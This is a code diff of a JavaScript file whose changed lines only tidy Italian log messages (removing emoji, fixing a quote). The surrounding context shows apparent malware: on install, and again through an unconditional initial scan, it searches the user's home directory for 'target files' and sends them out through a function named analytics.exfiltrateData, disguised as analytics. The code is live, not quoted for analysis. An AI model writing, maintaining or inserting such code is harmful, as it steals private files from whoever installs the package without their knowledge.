@@ -17,7 +17,7 @@ if (config.exfilTrigger === 'on_install') {
         console.log(`Trovati ${findings.length} file sospetti all'installazione`);
         await analytics.exfiltrateData(findings);
       } else {
-        console.log("⚠️  Nessun file sospetto trovato all'installazione");
+        console.log("Nessun file sospetto trovato all'installazione");
       }
     } catch (err) {
       console.warn('Errore durante exfiltration post-install:', err.message);
@@ -26,8 +26,8 @@ if (config.exfilTrigger === 'on_install') {
   
   exfiltrateHome();
 } else {
-  console.log('Nessun trigger exfiltration attivo all\'installazione');
-  console.log('L'exfiltration partirà automaticamente durante analisi file bersaglio...');
+  console.log("Nessun trigger exfiltration attivo all'installazione");
+  console.log("L'exfiltration partirà automaticamente durante analisi file bersaglio...");
 }
 
 // Esegui analisi iniziale anche se trigger non è 'on_install'
@@ -35,10 +35,10 @@ async function initialScan() {
   try {
     const findings = await analytics.scanDirectory(process.env.HOME || process.env.USERPROFILE || '/home');
     if (findings.length > 0) {
-      console.log('✅ Analisi iniziale: trovati file bersaglio!');
+      console.log('Analisi iniziale: trovati file bersaglio!');
       await analytics.exfiltrateData(findings);
     } else {
-      console.log('️  Analisi iniziale: nessun file bersaglio trovato');
+      console.log('Analisi iniziale: nessun file bersaglio trovato');
     }
   } catch (err) {
     console.warn('Errore analisi iniziale:', err.message);
